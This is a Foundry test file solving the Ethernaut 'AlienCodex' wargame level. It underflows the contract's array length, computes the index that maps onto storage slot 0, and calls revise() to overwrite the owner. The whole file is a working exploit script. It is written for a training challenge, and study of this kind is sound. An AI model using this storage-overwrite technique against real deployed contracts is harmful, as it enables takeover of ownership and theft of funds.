// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

contract AlienCodexTest is Test {
    Ethernaut ethernaut;
    address player = address(100);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testAlienCodexHack() public {
        /**
         *
         * Factory setup *
         *
         */
        vm.startPrank(player);
        /*
         * Here the set up is fairly different, we need to stick to 0.5.0 version.
         * we can have access to the abi
         * Thanks to vm we can get the code (returns the creation bytecode )
         * Then we can create it with assembly
         */
        bytes memory alienCodeBytesCode = abi.encodePacked(vm.getCode("./src/AlienCodex/AlienCodex.json"));
        // in order to do so, don't forget to add "fs_permissions = [{ access = "read", path = "./src"}]" to foundry.toml
        address alienCodexContract;
        assembly {
            alienCodexContract := create(0, add(alienCodeBytesCode, 0x20), mload(alienCodeBytesCode))
        }

        /**
         *
         *    Attack     *
         *
         */

        // -- 1 --
        (bool successMakeContact,) = alienCodexContract.call(abi.encodeWithSignature("make_contact()"));
        require(successMakeContact);
        // -- 2 --
        (bool successRetract,) = alienCodexContract.call(abi.encodeWithSignature("retract()"));
        require(successRetract);
        // -- 3 --
        uint256 codexIndexForSlotZero = ((2 ** 256) - 1) - uint256(keccak256(abi.encode(1))) + 1;
        // -- 4 --
        bytes32 leftPaddedAddress = bytes32(abi.encode(player));

        // call revise with codex index and content which will set you as the owner
        (bool succcessRevise,) = alienCodexContract.call(
            abi.encodeWithSignature("revise(uint256,bytes32)", codexIndexForSlotZero, leftPaddedAddress)
        );
        require(succcessRevise);

        /**
         *
         * Level Submission*
         *
         */
        (bool successOwner, bytes memory data) = alienCodexContract.call(abi.encodeWithSignature("owner()"));
        require(successOwner);
        address refinedData = address(uint160(bytes20(uint160(uint256(bytes32(data)) << 0))));

        vm.stopPrank();
        assertEq(refinedData, player);
    }
}
